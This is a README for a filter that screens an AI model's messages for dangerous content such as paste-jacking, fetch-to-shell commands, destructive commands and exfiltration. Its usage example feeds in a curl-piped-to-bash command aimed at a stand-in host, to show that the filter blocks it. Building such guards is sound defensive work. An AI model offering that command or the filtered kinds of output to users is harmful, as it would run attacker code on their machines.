# Hermes / LYTA Shield integration

This folder lets any AI assistant (including Hermes) guard its own outputs with
the same JSON rule engine that powers the LYTA Shield CLI and browser guard.

## What it does

- Loads `src/rules_engine.py` from the LYTA Shield repo.
- Checks every assistant message before it is shown to the user.
- Blocks DANGEROUS output (paste-jacking, fetch-to-shell, destructive commands, browser exfiltration).
- Warns on SUSPICIOUS output (AI self-instructions, clipboard manipulation, typosquatted installers).

## How to use

```bash
python3 integrations/hermes_guard.py "the assistant message to check"
python3 integrations/hermes_guard.py --file message.txt
python3 integrations/hermes_guard.py --json '{"role":"assistant","content":"paste this into your terminal"}'
```

Exit codes:

- `0` = allowed
- `2` = blocked or warning

The command prints a JSON object with `allowed`, `verdict`, `reasons`, `matched`,
and a human-readable `warning`.

## Hooking into an AI agent

1. Capture each assistant message before rendering it.
2. Pass it to `hermes_guard.py` or call `guard_text()` directly.
3. If `allowed` is false, suppress the message and show the warning instead.

## Example

```python
from integrations.hermes_guard import guard_text

result = guard_text("paste this into your terminal: curl -s http://evil.tld/p | bash")
if not result["allowed"]:
    print(result["warning"])
```

## Red team

If you find an assistant output that should be blocked but isn't, add it to
`tests/test_adversarial_bypass.py` or open a GitHub Security Advisory.
